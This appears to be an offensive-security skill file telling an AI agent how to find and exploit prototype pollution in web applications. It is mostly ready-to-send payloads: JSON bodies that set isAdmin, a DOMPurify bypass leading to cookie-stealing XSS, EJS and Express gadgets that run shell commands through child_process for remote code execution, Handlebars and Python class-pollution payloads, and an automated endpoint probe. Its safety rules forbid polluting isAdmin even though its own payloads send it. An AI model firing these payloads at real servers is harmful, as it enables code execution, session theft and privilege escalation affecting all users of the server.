---
name: prototype-pollution
description: >
  Prototype Pollution detection and gadget chaining. Covers server-side (Node.js
  merge/deep-extend, Python class pollution) and client-side (DOM clobbering,
  DOMPurify bypass, jQuery deep-extend). Includes gadget chains for RCE via
  EJS/Pug/Handlebars and XSS via DOMPurify bypass.
metadata:
  tags: "prototype-pollution,prototype,nodejs,python,jquery,dumpurify,gadget,xss,rce"
  category: "offensive-security"
---

# Prototype Pollution — Detection & Exploitation

> Polluting Object.prototype or Class.__proto__ can modify application behavior
> globally. A single polluted property can trigger XSS, RCE, or auth bypass
> deep in framework internals.

## 1. Server-Side Detection (Node.js)

### Detection Payloads

Send to ANY endpoint that merges JSON objects (user settings, preferences, etc.):

```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"__proto__": {"status": "polluted"}}
```

### Verify Pollution

After sending the payload, check if the property persisted:

```python
# Send a request that queries object properties
# If the server reflects Object.keys() or has any GET endpoint
# that returns user data, check for the polluted property
resp = fetch("{target}/api/user/me")
assert "isAdmin" not in resp.json()  # Should NOT be in response normally
# If isAdmin now appears → pollution confirmed
```

### Vulnerable Node.js Patterns

```javascript
// lodash.merge (vulnerable before 4.6.0)
_.merge(target, req.body);

// lodash.defaultsDeep
_.defaultsDeep(target, req.body);

// Custom recursive merge
function merge(a, b) {
    for (let key in b) {
        if (typeof b[key] === 'object') {
            a[key] = merge(a[key] || {}, b[key]);
        } else {
            a[key] = b[key];
        }
    }
}

// Object.assign (shallow — needs nested path)
Object.assign(target, req.body);
```

## 2. Client-Side Detection

### URL Parameter Pollution

```
https://target.com/page?__proto__[isAdmin]=true
https://target.com/page?constructor[prototype][isAdmin]=true
```

### JavaScript Detection Gadget

```javascript
// Inject via evaluate_script in chrome-devtools
(function() {
    // Test 1: Check if Object.prototype is already polluted
    var test = {};
    var pollutedKeys = [];
    for (var key in test) {
        pollutedKeys.push(key);
    }
    
    // Test 2: Try to pollute and verify
    try {
        var a = {};
        a.__proto__.polluted = true;
        var b = {};
        if (b.polluted === true) {
            return {vulnerable: true, method: "direct __proto__", pollutedKeys: pollutedKeys};
        }
    } catch(e) {}
    
    // Test 3: Via constructor
    try {
        var a = {};
        a.constructor.prototype.polluted2 = true;
        var b = {};
        if (b.polluted2 === true) {
            return {vulnerable: true, method: "constructor.prototype", pollutedKeys: pollutedKeys};
        }
    } catch(e) {}
    
    return {vulnerable: false, pollutedKeys: pollutedKeys};
})();
```

## 3. Gadget Chains

### Gadget 1: DOMPurify Bypass → XSS

```json
POST /api/preferences HTTP/1.1
Content-Type: application/json

{"__proto__": {
    "ALLOWED_ATTR": ["onerror", "src", "onload"],
    "ALLOWED_URI_REGEXP": null
}}
```

After polluting ALLOWED_ATTR:
```html
<img src=x onerror=alert(document.cookie)>
→ DOMPurify now ALLOWS onerror → XSS fires
```

### Gadget 2: EJS Template Engine → RCE

```json
POST /api/settings HTTP/1.1
Content-Type: application/json

{"__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"
}}
```

When the server renders ANY EJS template after pollution:
```
outputFunctionName = "x;process.mainModule.require('child_process').execSync('id');s"
→ RCE
```

### Gadget 3: Handlebars → RCE

```json
POST /api/preferences HTTP/1.1
Content-Type: application/json

{"__proto__": {
    "knownHelpers": {
        "exec": true
    },
    "precompileOptions": {
        "knownHelpersOnly": false
    }
}}
```

### Gadget 4: Express View Options → RCE

```json
POST /api/settings HTTP/1.1
Content-Type: application/json

{"__proto__": {
    "view options": {
        "client": true,
        "escapeFunction": "function(){};process.mainModule.require('child_process').execSync('id');"
    }
}}
```

### Gadget 5: Nested Property Pollution (lodash.defaultsDeep)

```json
POST /api/config HTTP/1.1
Content-Type: application/json

{"constructor": {
    "prototype": {
        "env": {
            "NODE_OPTIONS": "--require /proc/self/environ"
        },
        "shell": "/bin/bash"
    }
}}
```

## 4. Python Class Pollution

```python
# Python class pollution via merge operations

# Payload:
{"__class__": {"__init__": {"__globals__": {"polluted": True}}}}
{"__class__": {"__base__": {"__subclasses__": "..."}}}

# Vulnerable pattern:
# user_input_processed_by_merge(data, request.json)
# → If merge allows __class__ traversal

# Detection:
# Send payload → check if new attributes appear on base classes
```

## 5. Automated Test Sequence

### Server-Side Probe

```python
import json

payloads = [
    {"__proto__": {"ppTest": "polluted_001"}},
    {"constructor": {"prototype": {"ppTest": "polluted_002"}}},
    {"__proto__": {"isAdmin": True}},
]

endpoints_to_test = [
    "/api/user/settings",
    "/api/user/preferences", 
    "/api/config",
    "/api/profile",
    "/api/account",
]

for endpoint in endpoints_to_test:
    for payload in payloads:
        resp = fetch(f"{{target}}{endpoint}",
                     method="POST",
                     headers={"Content-Type": "application/json"},
                     body=json.dumps(payload))
        
        # Check for 200 — pollution was accepted
        if resp.status == 200:
            # Verify: check if property persisted on next GET
            check = fetch(f"{{target}}{endpoint}", method="GET")
            if "ppTest" in check.text or "isAdmin" in check.text:
                log(f"[VULNERABLE] {endpoint} with {payload}")
```

### Client-Side Probe

```javascript
// Inject via chrome-devtools
var testPayloads = [
    {key: "__proto__[ppTest]", value: "polluted_001"},
    {key: "constructor[prototype][ppTest]", value: "polluted_002"},
];

// For each input on the page, inject test payload
document.querySelectorAll('input, textarea').forEach(function(el) {
    var form = el.closest('form');
    if (form) {
        // Submit with pollution payloads
    }
});

// After submit, check:
var testObj = {};
var isPolluted = false;
for (var key in testObj) {
    if (testObj[key] && String(testObj[key]).includes('polluted')) {
        isPolluted = true;
    }
}
```

## 6. Output

```
findings/
└── prototype_pollution/
    ├── _pollution_probes.json      # All probes sent
    ├── _vulnerable_endpoints.json  # Endpoints with confirmed pollution
    ├── _gadgets_available.json     # Gadgets found in JS source
    └── _poc/
        ├── dompurify_bypass.html   # DOMPurify bypass PoC
        └── ejs_rce_poc.js          # EJS RCE PoC
```

## 7. Rules

```
⛔ Only pollute test properties (ppTest, pollution_test)
⛔ NEVER pollute production properties (isAdmin, role, balance)
⛔ Clean up after test: DELETE the test account/settings
⛔ Server-side pollution affects ALL users — test ONCE, clean immediately
```
